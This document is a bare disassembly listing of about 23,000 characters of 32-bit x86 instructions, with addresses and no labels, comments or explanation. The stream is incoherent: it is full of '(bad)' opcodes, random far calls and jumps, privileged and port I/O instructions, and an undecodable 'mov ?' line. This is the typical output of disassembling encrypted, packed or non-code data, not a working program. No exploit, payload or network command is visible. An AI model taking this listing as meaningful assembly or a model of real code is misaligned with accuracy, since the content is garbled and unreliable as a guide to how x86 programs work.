  4155fb:	sub    DWORD PTR [eax-0x57],esi
  4155fe:	int3   
  4155ff:	xor    ebp,eax
  415601:	mov    ch,0x32
  415603:	inc    edx
  415604:	dec    esi
  415605:	addr16 mov ah,0xdf
  415608:	pop    ss
  415609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41560a:	or     al,0x78
  41560c:	(bad)  
  41560d:	xor    BYTE PTR [edi+ebp*8-0x778ffd63],bh
  415614:	inc    edi
  415615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415616:	jnp    0x4155fe
  415618:	inc    ebp
  415619:	add    BYTE PTR [edx+0x20],dl
  41561c:	bound  edx,QWORD PTR [edi+0x43]
  41561f:	pop    es
  415620:	fimul  DWORD PTR [ebx+0x2f]
  415623:	iret   
  415624:	sbb    edx,DWORD PTR [ebp+0x15435136]
  41562a:	jge    0x41562d
  41562c:	sbb    bh,bl
  41562e:	test   DWORD PTR [ebp-0x51dfdff],edi
  415634:	test   BYTE PTR [edi+esi*1],al
  415637:	inc    edx
  415638:	ins    DWORD PTR es:[edi],dx
  415639:	daa    
  41563a:	ins    DWORD PTR es:[edi],dx
  41563b:	mov    bl,0x10
  41563d:	dec    ecx
  41563e:	inc    esi
  41563f:	cmp    BYTE PTR [edx+eax*8],bh
  415642:	imul   esi,ebx,0xfb6a5707
  415648:	dec    ecx
  415649:	outs   dx,DWORD PTR ds:[esi]
  41564a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41564b:	xlat   BYTE PTR fs:[ebx]
  41564d:	enter  0xf692,0xff
  415651:	sbb    eax,esi
  415653:	mov    ecx,0x9b91091c
  415658:	fstp   QWORD PTR [ebx+esi*2]
  41565b:	push   eax
  41565c:	sub    eax,DWORD PTR [ecx+esi*4+0x13dc952d]
  415663:	lahf   
  415664:	pop    eax
  415665:	and    al,0x7c
  415667:	xor    ah,BYTE PTR [eax+0x73685a96]
  41566d:	push   edx
  41566e:	mov    cl,0xe9
  415670:	(bad)  
  415671:	push   edx
  415672:	fs leave 
  415674:	repz sbb ecx,eax
  415677:	popa   
  415678:	pop    esp
  415679:	mov    al,0x27
  41567b:	out    0x83,al
  41567d:	ficom  WORD PTR [edx]
  41567f:	sbb    al,BYTE PTR [ebp-0x7ad58a88]
  415685:	mov    ebp,0xb0dbcb80
  41568a:	or     eax,0x4e5ad322
  41568f:	aad    0xe0
  415691:	jns    0x4156bb
  415693:	pop    edi
  415694:	mov    bl,0x2b
  415696:	cmc    
  415697:	xor    ah,cl
  415699:	pop    edi
  41569a:	mov    ecx,gs
  41569c:	mov    al,0x6f
  41569e:	or     ebp,DWORD PTR [ebx-0x132b6ed5]
  4156a4:	mov    ch,0xfd
  4156a6:	add    bh,BYTE PTR [edi-0x62]
  4156a9:	and    cl,BYTE PTR [edx-0x3c]
  4156ac:	xor    DWORD PTR [ebp-0x80],esp
  4156af:	fistp  DWORD PTR [ecx]
  4156b1:	lock xor eax,0xb244869a
  4156b7:	fnstenv [esi+0x5df440f6]
  4156bd:	adc    al,0x6
  4156bf:	sbb    esi,ebp
  4156c1:	push   edx
  4156c2:	psrld  mm2,mm4
  4156c5:	test   eax,0xd8eb603a
  4156ca:	mov    al,ds:0x7af9708b
  4156cf:	out    dx,eax
  4156d0:	cmc    
  4156d1:	cwde   
  4156d2:	fdiv   QWORD PTR ds:0x242cb6bc
  4156d8:	(bad)  
  4156d9:	out    dx,al
  4156da:	je     0x41574c
  4156dc:	fdiv   QWORD PTR [ecx+0x7798721]
  4156e2:	iret   
  4156e3:	aam    0x20
  4156e5:	retf   0xfdc1
  4156e8:	aam    0xe2
  4156ea:	jns    0x4156f0
  4156ec:	out    dx,al
  4156ed:	xchg   ebx,eax
  4156ee:	or     BYTE PTR [ecx-0xb5eeaf6],ah
  4156f4:	fimul  DWORD PTR [ecx+eax*4+0x24b2ba29]
  4156fb:	push   ds
  4156fc:	sub    al,cl
  4156fe:	retf   
  4156ff:	sub    edx,DWORD PTR [ebx]
  415701:	jnp    0x41577e
  415703:	mov    DWORD PTR [eax+eiz*4],eax
  415706:	jmp    0xafc66106
  41570b:	fstp   DWORD PTR [ebx+esi*8-0x61dbc9c2]
  415712:	fsubr  DWORD PTR [ebx+ebx*4]
  415715:	out    dx,al
  415716:	inc    esp
  415717:	iret   
  415718:	or     eax,0x683ea551
  41571d:	mov    ebp,0x2a0b6541
  415722:	cmp    BYTE PTR [ecx+0x5d],0xf2
  415726:	movaps XMMWORD PTR [ecx+0x3e2cf319],xmm7
  41572d:	jo     0x4156fb
  41572f:	cmp    al,0x19
  415731:	adc    al,0x83
  415733:	xchg   ecx,eax
  415734:	mov    DWORD PTR [esp+ebx*8-0x1c63b321],ebp
  41573b:	leave  
  41573c:	and    eax,DWORD PTR [edx+0x7313ae3f]
  415742:	sub    edx,edx
  415744:	sbb    cl,dl
  415746:	or     eax,DWORD PTR [edx+0x8]
  415749:	add    ecx,DWORD PTR [edx-0x4b]
  41574c:	push   ebp
  41574d:	(bad)  
  41574e:	imul   ebx,DWORD PTR [eax+0x3ba6ded],0x3c
  415755:	mov    gs,WORD PTR [edx]
  415757:	ins    DWORD PTR es:[edi],dx
  415758:	repz enter 0xa524,0x47
  41575d:	ins    DWORD PTR es:[edi],dx
  41575e:	cwde   
  41575f:	xor    DWORD PTR [edi+0x3d],eax
  415762:	sbb    BYTE PTR [edx-0x25ee4679],dh
  415768:	fadd   QWORD PTR [ebp-0x71]
  41576b:	outs   dx,DWORD PTR ds:[esi]
  41576c:	div    edx
  41576e:	hlt    
  41576f:	aaa    
  415770:	clc    
  415771:	retf   
  415772:	ret    
  415773:	lahf   
  415774:	add    eax,0x417a4dcd
  415779:	push   ecx
  41577a:	xchg   ebx,eax
  41577b:	dec    ebx
  41577c:	jp     0x415714
  41577e:	and    BYTE PTR [ebp+0x18cf6ad7],dl
  415784:	mov    ds:0xfef30e04,al
  415789:	adc    DWORD PTR [ebx-0x1c166710],edi
  41578f:	daa    
  415790:	dec    ebx
  415791:	test   eax,0xebc666bc
  415796:	gs add eax,0xea2f5e5e
  41579c:	fld    QWORD PTR [ebx-0x3bbbec05]
  4157a2:	cdq    
  4157a3:	push   edx
  4157a4:	mov    cl,al
  4157a6:	(bad)  
  4157a7:	cs inc edi
  4157a9:	ins    BYTE PTR es:[edi],dx
  4157aa:	(bad)  
  4157ab:	nop
  4157ac:	daa    
  4157ad:	sar    BYTE PTR [ecx+0x2d2b81ac],0xf9
  4157b4:	stos   BYTE PTR es:[edi],al
  4157b5:	idiv   DWORD PTR [eax-0x60]
  4157b8:	cmp    BYTE PTR [edi-0xb],dh
  4157bb:	shl    BYTE PTR [edi],1
  4157bd:	push   es
  4157be:	push   0x9183efc7
  4157c3:	lods   al,BYTE PTR ds:[esi]
  4157c4:	ins    DWORD PTR es:[edi],dx
  4157c5:	sbb    eax,0x40745440
  4157ca:	lds    edx,FWORD PTR [edi]
  4157cc:	inc    esi
  4157cd:	jbe    0x415849
  4157cf:	add    al,0x76
  4157d1:	sub    bl,bl
  4157d3:	xchg   esi,eax
  4157d4:	sbb    esi,DWORD PTR [eax+0x7a]
  4157d7:	sub    BYTE PTR [edx],0xe1
  4157da:	sub    ecx,edx
  4157dc:	fdiv   st,st(1)
  4157de:	and    ebx,edi
  4157e0:	in     eax,dx
  4157e1:	retf   
  4157e2:	aam    0x25
  4157e4:	les    edi,FWORD PTR [ebp+0x4a]
  4157e7:	(bad)  
  4157e8:	hlt    
  4157e9:	call   0xc040:0x1942dfb
  4157f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157f1:	add    al,0xcb
  4157f3:	xor    ch,BYTE PTR [ebp-0x38fdeb24]
  4157f9:	je     0x4157c1
  4157fb:	xor    ebx,DWORD PTR [ebx]
  4157fd:	or     BYTE PTR ds:0xed1a9442,cl
  415803:	adc    BYTE PTR ds:0x5bd2999c,dl
  415809:	ds pop esp
  41580b:	dec    ebp
  41580c:	nop    DWORD PTR [edi+0x6eeda75f]
  415813:	test   esi,edx
  415815:	aas    
  415816:	repnz out dx,al
  415818:	enter  0x8b87,0xd2
  41581c:	stos   DWORD PTR es:[edi],eax
  41581d:	or     DWORD PTR [esi+0x7f11466d],0xfffffff4
  415824:	test   DWORD PTR [esp+edi*2+0x3a],esp
  415828:	inc    edx
  415829:	mov    bl,0x5
  41582b:	dec    ecx
  41582c:	call   0x169c6824
  415831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415832:	loop   0x41581b
  415834:	repz cmp al,0xe
  415837:	sub    dh,0x8d
  41583a:	sub    BYTE PTR [edx],bl
  41583c:	mov    eax,ds:0x161d85e
  415841:	sahf   
  415842:	mov    edi,0x9a9606b9
  415847:	mov    eax,0xf801393e
  41584c:	dec    ebp
  41584d:	ds aaa 
  41584f:	lock (bad) 
  415851:	(bad)  
  415852:	add    BYTE PTR [edi-0x62],dl
  415855:	cmp    esi,ebp
  415857:	rol    BYTE PTR [ebx],0x4e
  41585a:	outs   dx,DWORD PTR ss:[esi]
  41585c:	arpl   WORD PTR [esi+0x2ba41376],sp
  415862:	dec    esi
  415863:	repz push ebp
  415865:	push   ebx
  415866:	scas   al,BYTE PTR es:[edi]
  415867:	mov    al,0x16
  415869:	in     eax,dx
  41586a:	inc    eax
  41586b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41586c:	lock xchg edx,eax
  41586e:	or     DWORD PTR [edi-0x11199409],ebp
  415874:	inc    edx
  415875:	lock das 
  415877:	xor    ch,bh
  415879:	mov    ebp,0x130469ed
  41587e:	fimul  WORD PTR [ecx+0x2336845a]
  415884:	call   0xd3cd:0xa00774de
  41588b:	push   eax
  41588c:	push   es
  41588d:	dec    BYTE PTR [ecx+0x0]
  415890:	add    al,0xd2
  415892:	mov    esp,esi
  415894:	add    BYTE PTR [edx+0x31],dl
  415897:	(bad)  
  415898:	push   esp
  415899:	fild   QWORD PTR [eax+0x6b]
  41589c:	dec    ecx
  41589d:	push   cs
  41589e:	push   0x7a
  4158a0:	sub    eax,0x4bca6740
  4158a5:	shl    BYTE PTR [eax+0x29],0x39
  4158a9:	icebp  
  4158aa:	mov    dl,0xa3
  4158ac:	pop    ebx
  4158ad:	(bad)
  4158b0:	fstp   TBYTE PTR [ecx-0x34]
  4158b3:	mov    ds:0xd65e4,eax
  4158b8:	jl     0x415862
  4158ba:	rol    ch,0xa8
  4158bd:	xchg   esi,eax
  4158be:	jnp    0x41591d
  4158c0:	xlat   BYTE PTR ds:[ebx]
  4158c1:	or     al,0x9f
  4158c3:	mov    eax,0x5452dd5
  4158c8:	fwait
  4158c9:	shr    DWORD PTR [eax],cl
  4158cb:	or     esi,ecx
  4158cd:	mov    WORD PTR [edx+0x14e7a655],gs
  4158d3:	(bad)  
  4158d4:	hlt    
  4158d5:	dec    esi
  4158d6:	dec    edi
  4158d7:	nop
  4158d8:	pop    edi
  4158d9:	arpl   WORD PTR [ecx+0x9837a9a],bx
  4158df:	push   ds
  4158e0:	jne    0x4158a7
  4158e2:	test   ch,0xd9
  4158e5:	jg     0x4158aa
  4158e7:	mov    eax,DWORD PTR [ebp+0x3748f6af]
  4158ed:	cld    
  4158ee:	jnp    0x41593b
  4158f0:	bound  edx,QWORD PTR [edx+0x63]
  4158f3:	cdq    
  4158f4:	xor    al,0x3c
  4158f6:	xor    eax,0x11c2ae1b
  4158fb:	(bad)  
  4158fc:	fidiv  DWORD PTR [ecx]
  4158fe:	mov    dh,0xe2
  415900:	es adc eax,0x91cb0f33
  415906:	addr16 in al,dx
  415908:	in     eax,dx
  415909:	inc    ebp
  41590a:	pop    esi
  41590b:	push   esp
  41590c:	or     al,0xb1
  41590e:	jne    0x415940
  415910:	cwde   
  415911:	jp     0x415923
  415913:	frstor [ecx+0x13bfa07]
  415919:	mov    ecx,fs
  41591b:	scas   eax,DWORD PTR es:[edi]
  41591c:	jae    0x4158b0
  41591e:	daa    
  41591f:	mov    ch,0x6b
  415921:	adc    dh,BYTE PTR [ecx+0x3a]
  415924:	push   esi
  415925:	lds    ebx,FWORD PTR [edi-0x6e]
  415928:	enter  0xa981,0x2b
  41592c:	sub    esi,DWORD PTR [esp+eax*1+0x2c]
  415930:	shl    ah,1
  415932:	retf   
  415933:	add    dh,ch
  415935:	int    0x4
  415937:	sub    eax,0xcdfea7f9
  41593c:	push   esi
  41593d:	jl     0x415959
  41593f:	hlt    
  415940:	div    ch
  415942:	lods   eax,DWORD PTR ds:[esi]
  415943:	popa   
  415944:	fwait
  415945:	icebp  
  415946:	inc    eax
  415947:	sahf   
  415948:	fild   WORD PTR [ebx]
  41594a:	sbb    eax,0xa87ac3e3
  41594f:	mov    dl,0x12
  415951:	jns    0x41595f
  415953:	mov    ch,0x41
  415955:	jp     0x4159b0
  415957:	(bad)  
  415958:	fcom   DWORD PTR [edx-0x14]
  41595b:	push   es
  41595c:	ja     0x4159c2
  41595e:	add    BYTE PTR [ecx-0x5],0x62
  415962:	loop   0x4159db
  415964:	jmp    0x4158fc
  415966:	loop   0x4159b4
  415968:	push   ds
  415969:	adc    eax,ebp
  41596b:	hlt    
  41596c:	fdivr  QWORD PTR [edi-0x13dee813]
  415972:	add    cl,0x44
  415975:	jle    0x415990
  415977:	pushw  0xe49d
  41597b:	jle    0x41599f
  41597d:	outs   dx,BYTE PTR ds:[esi]
  41597e:	sti    
  41597f:	pushf  
  415980:	inc    edi
  415981:	fdiv   QWORD PTR [edi-0x6c2d2d90]
  415987:	pop    esp
  415988:	add    ebp,DWORD PTR ds:0x62d5db85
  41598e:	cdq    
  41598f:	cmp    ebx,edi
  415991:	outs   dx,DWORD PTR ds:[esi]
  415992:	pusha  
  415993:	mov    edx,0xd62ae741
  415998:	cmp    BYTE PTR [ebp+0xb770386],dl
  41599e:	popa   
  41599f:	aas    
  4159a0:	add    BYTE PTR [ecx-0x61],bh
  4159a3:	inc    esp
  4159a4:	xchg   ebx,eax
  4159a5:	in     eax,dx
  4159a6:	outs   dx,DWORD PTR ds:[esi]
  4159a7:	lods   al,BYTE PTR ds:[esi]
  4159a8:	xchg   esi,eax
  4159a9:	(bad)  
  4159aa:	stos   BYTE PTR es:[edi],al
  4159ab:	xlat   BYTE PTR ds:[ebx]
  4159ac:	fisubr WORD PTR [esi-0x48]
  4159af:	je     0x415966
  4159b1:	jbe    0x4159ad
  4159b3:	scas   eax,DWORD PTR es:[edi]
  4159b4:	inc    ebp
  4159b5:	xor    cl,BYTE PTR [edx+0x60ef590a]
  4159bb:	ins    DWORD PTR es:[edi],dx
  4159bc:	xor    eax,0x31b21f6d
  4159c1:	mov    DWORD PTR [ecx],ebx
  4159c3:	pop    ecx
  4159c4:	sbb    ah,BYTE PTR [edx-0x2]
  4159c7:	push   edi
  4159c8:	int3   
  4159c9:	sbb    esp,DWORD PTR [esi+eax*8+0x6012b800]
  4159d0:	arpl   bp,sp
  4159d2:	xchg   edx,eax
  4159d3:	dec    esi
  4159d4:	push   ds
  4159d5:	out    0x8d,eax
  4159d7:	adc    DWORD PTR [ebx],ebp
  4159d9:	dec    edi
  4159da:	lds    ecx,FWORD PTR ds:0xb8e5abb5
  4159e0:	add    ah,cl
  4159e2:	or     eax,0x3d95ee6e
  4159e7:	jle    0x4159db
  4159e9:	inc    edi
  4159ea:	sar    ebx,1
  4159ec:	jae    0x415a16
  4159ee:	imul   DWORD PTR [edi]
  4159f0:	les    ebp,FWORD PTR [ebx+ebx*2-0x7f]
  4159f4:	xchg   ebp,eax
  4159f5:	inc    ecx
  4159f6:	test   BYTE PTR [ebp-0x1bcc022e],0xd9
  4159fd:	jb     0x415a39
  4159ff:	lea    edi,[edx+esi*8+0x5dc9c875]
  415a06:	fisttp WORD PTR [edx]
  415a08:	mov    eax,ds:0xf6a9a765
  415a0d:	adc    BYTE PTR [ebx-0x77],dl
  415a10:	ds pop edi
  415a12:	push   esi
  415a13:	jns    0x415a6a
  415a15:	not    DWORD PTR [eax+0x12]
  415a18:	les    edi,FWORD PTR [edi]
  415a1a:	pop    esi
  415a1b:	ror    DWORD PTR [edx-0x3d],0xfd
  415a1f:	cmp    ebp,ecx
  415a21:	jle    0x415a8b
  415a23:	lahf   
  415a24:	xchg   ecx,eax
  415a25:	out    dx,al
  415a26:	das    
  415a27:	push   0x64c3e5df
  415a2c:	in     eax,0x25
  415a2e:	dec    esp
  415a2f:	push   esp
  415a30:	lea    esi,[ecx-0x6a]
  415a33:	int    0x1f
  415a35:	jg     0x415aae
  415a37:	inc    eax
  415a38:	mov    ds:0xa3b7e7f5,eax
  415a3d:	xchg   esp,eax
  415a3e:	std    
  415a3f:	stc    
  415a40:	enter  0xcfa9,0xa6
  415a44:	lea    esp,[edx+0x57efefb8]
  415a4a:	lea    edx,[ecx+ecx*2+0x4047e79b]
  415a51:	and    edi,ebp
  415a53:	cli    
  415a54:	jmp    0x4159e7
  415a56:	mov    bl,0xa5
  415a58:	jb     0x415a87
  415a5a:	cld    
  415a5b:	cld    
  415a5c:	adc    BYTE PTR [eax+esi*1+0xc1debcc],0xcd
  415a64:	es cs popa 
  415a67:	out    0x22,eax
  415a69:	pushf  
  415a6a:	dec    edx
  415a6b:	pop    ebx
  415a6c:	sahf   
  415a6d:	pop    ds
  415a6e:	mov    bl,0xbc
  415a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a71:	or     BYTE PTR [ebx-0x43],ah
  415a74:	adc    eax,0x34985691
  415a79:	xor    eax,0xa10b17dd
  415a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a7f:	adc    edx,DWORD PTR [eax+0x70]
  415a82:	out    0x7c,al
  415a84:	sub    DWORD PTR [edx+edi*8+0x6e],0xbd0eb17
  415a8c:	in     eax,0xd
  415a8e:	iret   
  415a8f:	adc    edx,ebp
  415a91:	sbb    BYTE PTR [ebx],ch
  415a93:	jmp    0x7337d349
  415a98:	xor    ch,BYTE PTR [esi-0x2f]
  415a9b:	shl    BYTE PTR [ebx+0x44e8abf4],1
  415aa1:	aam    0x70
  415aa3:	adc    DWORD PTR [ebx-0x6babaa],edx
  415aa9:	adc    esp,esp
  415aab:	ror    DWORD PTR [eax],0x4
  415aae:	push   cs
  415aaf:	div    DWORD PTR [ecx-0x28915d57]
  415ab5:	int    0xc2
  415ab7:	sar    BYTE PTR [eax-0x7],0x6e
  415abb:	and    eax,0xcfd4fe76
  415ac0:	addr16 pop edi
  415ac2:	push   cs
  415ac3:	push   esi
  415ac4:	fdivrp st(3),st
  415ac6:	inc    ecx
  415ac7:	std    
  415ac8:	pop    ebx
  415ac9:	add    eax,0x4a41cb12
  415ace:	bound  esp,QWORD PTR [edi-0x32adf309]
  415ad4:	jp     0x415b07
  415ad6:	rol    DWORD PTR [esi+0x67],1
  415ad9:	mov    ds:0x4f3620bd,al
  415ade:	inc    eax
  415adf:	ret    
  415ae0:	mov    cl,0xcf
  415ae2:	repz es inc eax
  415ae5:	loop   0x415b09
  415ae7:	(bad)  
  415ae8:	jnp    0x415aba
  415aea:	jge    0x415a74
  415aec:	pusha  
  415aed:	repz inc edi
  415aef:	test   BYTE PTR [ebp-0x6532111e],bh
  415af5:	push   es
  415af6:	add    esi,DWORD PTR [eax+0x56]
  415af9:	mov    dl,dl
  415afb:	scas   eax,DWORD PTR es:[edi]
  415afc:	cmp    eax,0xcbfe0292
  415b01:	sbb    al,0xfe
  415b03:	mov    cl,0x83
  415b05:	sub    al,0x10
  415b07:	inc    edx
  415b08:	jb     0x415b0a
  415b0a:	imul   edx,DWORD PTR [edi+0x673085e2],0x24240155
  415b14:	hlt    
  415b15:	dec    eax
  415b16:	or     dl,cl
  415b18:	imul   edi,DWORD PTR [edx-0x3a0f7ed4],0xffffffdf
  415b1f:	cmp    eax,0x3318c761
  415b24:	out    dx,al
  415b25:	outs   dx,DWORD PTR ds:[esi]
  415b26:	gs aaa 
  415b28:	xor    eax,DWORD PTR [edx-0x4b]
  415b2b:	repz xor ebx,esi
  415b2e:	int    0xc
  415b30:	stc    
  415b31:	xor    eax,0x8d8ee321
  415b36:	pop    ss
  415b37:	adc    bl,bl
  415b39:	dec    ebx
  415b3a:	add    BYTE PTR [esi],bl
  415b3c:	jl     0x415b61
  415b3e:	cmp    al,0x30
  415b40:	jnp    0x415b4d
  415b42:	push   ebp
  415b43:	ins    DWORD PTR es:[edi],dx
  415b44:	mov    esp,0x4b004628
  415b49:	add    al,0xf9
  415b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b4c:	xchg   DWORD PTR [edx],esi
  415b4e:	nop
  415b4f:	sub    BYTE PTR [ebx+ebx*2],dl
  415b52:	jle    0x415b24
  415b54:	sahf   
  415b55:	aad    0xd3
  415b57:	mov    cl,0xba
  415b59:	lahf   
  415b5a:	std    
  415b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5c:	jb     0x415b66
  415b5e:	mov    WORD PTR [esi],cs
  415b60:	mov    eax,ds:0x51b72311
  415b65:	and    DWORD PTR [edi],ebx
  415b67:	jmp    0xa9ec:0x3e0d6886
  415b6e:	jp     0x415bcd
  415b70:	imul   edx,DWORD PTR [edi+0x46],0xc2e66612
  415b77:	add    bh,BYTE PTR [eax+eax*4]
  415b7a:	mov    edi,0xdccb861b
  415b7f:	aas    
  415b80:	lahf   
  415b81:	scas   al,BYTE PTR es:[edi]
  415b82:	xchg   edi,eax
  415b83:	imul   ebp,DWORD PTR [esi+0x1d],0x6b
  415b87:	shl    BYTE PTR [esi],0x43
  415b8a:	xchg   BYTE PTR [esi+0x14a05243],al
  415b90:	rcl    BYTE PTR [ebp+0x33],1
  415b93:	xchg   esi,eax
  415b94:	sbb    DWORD PTR [ebp-0x29],0xce23f8e2
  415b9b:	jbe    0x415b84
  415b9d:	inc    edx
  415b9e:	add    DWORD PTR [ecx],0x15
  415ba1:	lahf   
  415ba2:	pop    edx
  415ba3:	not    DWORD PTR [ebx+0x16b966b]
  415ba9:	adc    dh,BYTE PTR [ebp+0x6]
  415bac:	adc    al,0x4b
  415bae:	jnp    0x415c1a
  415bb0:	pop    ecx
  415bb1:	jg     0x415b45
  415bb3:	push   edi
  415bb4:	cmp    BYTE PTR [esi-0x1d],ch
  415bb7:	mov    ecx,0xfbaa425
  415bbc:	cmc    
  415bbd:	jle    0x415b89
  415bbf:	imul   eax,DWORD PTR [eax+0x10],0x25
  415bc3:	sahf   
  415bc4:	div    ecx
  415bc6:	cmp    edx,DWORD PTR [edx]
  415bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bc9:	(bad)  
  415bca:	pusha  
  415bcb:	popf   
  415bcc:	mov    esp,0xc33656fe
  415bd1:	xchg   esp,eax
  415bd2:	pop    ebp
  415bd3:	fisub  DWORD PTR [edi-0x20]
  415bd6:	imul   ebp,edx,0xc486a75a
  415bdc:	add    BYTE PTR [eax+0x58],cl
  415bdf:	pop    ecx
  415be0:	inc    ebp
  415be1:	sahf   
  415be2:	in     al,0x5e
  415be4:	int    0x32
  415be6:	call   0xe6e6:0x2e8f6098
  415bed:	pop    ds
  415bee:	inc    eax
  415bef:	out    dx,al
  415bf0:	add    eax,0xb6d9e776
  415bf5:	xlat   BYTE PTR ds:[ebx]
  415bf6:	adc    al,0xce
  415bf8:	mov    esi,DWORD PTR [esi]
  415bfa:	rcr    DWORD PTR [ecx],0x92
  415bfd:	add    BYTE PTR [edx+ebx*2],bh
  415c00:	scas   eax,DWORD PTR es:[edi]
  415c01:	sbb    edi,esi
  415c03:	adc    eax,0xf3c9baea
  415c08:	sub    dl,BYTE PTR [ecx-0x15b04510]
  415c0e:	sbb    ah,BYTE PTR [edi]
  415c10:	sbb    DWORD PTR [esi+0x1f],0x36c12b45
  415c17:	cmp    BYTE PTR [esi+ebx*1-0x59],bh
  415c1b:	sbb    esi,DWORD PTR [esi-0x27]
  415c1e:	push   edi
  415c1f:	repz call 0x3f58:0x3b3fd881
  415c27:	xchg   DWORD PTR [eax-0x30],edx
  415c2a:	pop    es
  415c2b:	arpl   WORD PTR [edx],cx
  415c2d:	leave  
  415c2e:	jecxz  0x415c19
  415c30:	pop    ecx
  415c31:	xlat   BYTE PTR ds:[ebx]
  415c32:	mov    bh,0xb1
  415c34:	pop    edx
  415c35:	cdq    
  415c36:	mov    bh,0x3b
  415c38:	push   esp
  415c39:	sbb    BYTE PTR [ebx-0xadd9f60],dh
  415c3f:	cmp    al,0x68
  415c41:	fimul  WORD PTR [ebp+0x34cc19fb]
  415c47:	test   BYTE PTR [edx+eiz*4+0x380a9ba1],cl
  415c4e:	mov    edi,0x6cf7c4c9
  415c53:	sbb    ch,dl
  415c55:	push   esi
  415c56:	je     0x415c0f
  415c58:	adc    al,0x37
  415c5a:	das    
  415c5b:	imul   esi,DWORD PTR [esi-0x47],0x6fa31ae
  415c62:	mov    WORD PTR [ebx-0x5c],ss
  415c65:	std    
  415c66:	push   eax
  415c67:	shr    BYTE PTR [ecx+0x14],cl
  415c6a:	(bad)  
  415c6b:	ficom  DWORD PTR [ebp+0x3f0eed13]
  415c71:	arpl   ax,cx
  415c73:	test   BYTE PTR [edi-0x60],bl
  415c76:	mov    DWORD PTR [ecx],0xeac38129
  415c7c:	outs   dx,DWORD PTR ds:[esi]
  415c7d:	je     0x415c61
  415c7f:	inc    esp
  415c80:	xchg   esi,eax
  415c81:	in     al,dx
  415c82:	inc    ebx
  415c83:	push   ebp
  415c84:	dec    ebp
  415c85:	fbstp  TBYTE PTR [edi]
  415c87:	jb     0x415c75
  415c89:	gs mov dl,cl
  415c8c:	inc    edx
  415c8d:	call   0xdaba:0xdc5180a0
  415c94:	mov    bh,dl
  415c96:	lahf   
  415c97:	mov    eax,ds:0xf4ca66bb
  415c9c:	in     al,dx
  415c9d:	push   eax
  415c9e:	mov    ecx,0x1ad56fe1
  415ca3:	(bad)  
  415ca4:	dec    edi
  415ca5:	(bad)  
  415ca6:	rol    bl,cl
  415ca8:	stos   BYTE PTR es:[edi],al
  415ca9:	clc    
  415caa:	pushf  
  415cab:	and    eax,0x22e12a2a
  415cb0:	in     al,dx
  415cb1:	jb     0x415cf2
  415cb3:	xchg   ebx,eax
  415cb4:	ins    BYTE PTR es:[edi],dx
  415cb5:	xor    al,0x70
  415cb7:	cmp    al,0x3c
  415cb9:	cmc    
  415cba:	ror    BYTE PTR [edx],cl
  415cbc:	jbe    0x415cd9
  415cbe:	popf   
  415cbf:	test   al,0xfc
  415cc1:	stc    
  415cc2:	ja     0x415ca5
  415cc4:	cld    
  415cc5:	stos   DWORD PTR es:[edi],eax
  415cc6:	ret    0x4cbd
  415cc9:	repnz mov eax,0xaa3dbafa
  415ccf:	mov    cl,0xf
  415cd1:	addr16 inc esi
  415cd3:	sti    
  415cd4:	push   ss
  415cd5:	xor    al,0x96
  415cd7:	pop    ss
  415cd8:	xchg   ebp,eax
  415cd9:	and    eax,DWORD PTR [edx+0x4f5b84e8]
  415cdf:	push   0xffffffd6
  415ce1:	jp     0x415ced
  415ce3:	inc    esi
  415ce4:	imul   esi,DWORD PTR [edx+esi*1-0x1b],0xf3dfc120
  415cec:	and    eax,DWORD PTR [ecx]
  415cee:	mov    esp,0x4d10de7b
  415cf3:	scas   al,BYTE PTR es:[edi]
  415cf4:	push   ebp
  415cf5:	call   0x4603:0x827a6a08
  415cfc:	dec    esp
  415cfd:	push   esp
  415cfe:	icebp  
  415cff:	addr16 push esi
  415d01:	add    bh,al
  415d03:	lods   al,BYTE PTR ds:[esi]
  415d04:	sar    ecx,1
  415d06:	or     eax,0x37f147
  415d0b:	jbe    0x415ca3
  415d0d:	outs   dx,BYTE PTR ds:[esi]
  415d0e:	scas   al,BYTE PTR es:[edi]
  415d0f:	xor    DWORD PTR [edi-0x32],esi
  415d12:	int    0xa4
  415d14:	stos   DWORD PTR es:[edi],eax
  415d15:	adc    al,0x4a
  415d17:	push   es
  415d18:	mov    dl,0x79
  415d1a:	hlt    
  415d1b:	cmp    al,ah
  415d1d:	sbb    ebp,DWORD PTR [ebx]
  415d1f:	pop    edi
  415d20:	jnp    0x415cae
  415d22:	dec    ecx
  415d23:	xor    esp,edi
  415d25:	pop    DWORD PTR [ebx-0x45]
  415d28:	xlat   BYTE PTR ds:[ebx]
  415d29:	aaa    
  415d2a:	std    
  415d2b:	ins    DWORD PTR es:[edi],dx
  415d2c:	aaa    
  415d2d:	mov    al,0xd6
  415d2f:	test   BYTE PTR [eax+0x47],ch
  415d32:	xor    al,0x77
  415d34:	je     0x415d45
  415d36:	push   esp
  415d37:	add    al,0x1f
  415d39:	imul   edx,DWORD PTR cs:[ecx-0x662833cd],0x5d457971
  415d44:	sbb    eax,0x174e4a89
  415d49:	clc    
  415d4a:	xchg   esi,eax
  415d4b:	xchg   esi,esp
  415d4d:	repz jno 0x415d93
  415d50:	cmp    ecx,edi
  415d52:	cmp    eax,0x5b3a733e
  415d57:	xor    al,0xa8
  415d59:	out    dx,al
  415d5a:	and    edi,DWORD PTR [ecx]
  415d5c:	repz js 0x415d84
  415d5f:	pop    edi
  415d60:	inc    esi
  415d61:	sbb    al,0xca
  415d63:	xchg   ecx,eax
  415d64:	loope  0x415da6
  415d66:	pop    esi
  415d67:	div    BYTE PTR [eax+0x111aff3b]
  415d6d:	lods   eax,DWORD PTR ds:[esi]
  415d6e:	mov    ?,WORD PTR [esi]
  415d70:	add    eax,0x2ab7f06d
  415d75:	mov    edx,0x539803de
  415d7a:	cdq    
  415d7b:	mov    ebx,0x96a6c8b3
  415d80:	cmc    
  415d81:	add    BYTE PTR [ebp-0x7],bl
  415d84:	loop   0x415dd2
  415d86:	adc    bl,BYTE PTR [edi-0x6757fbdf]
  415d8c:	xchg   edx,eax
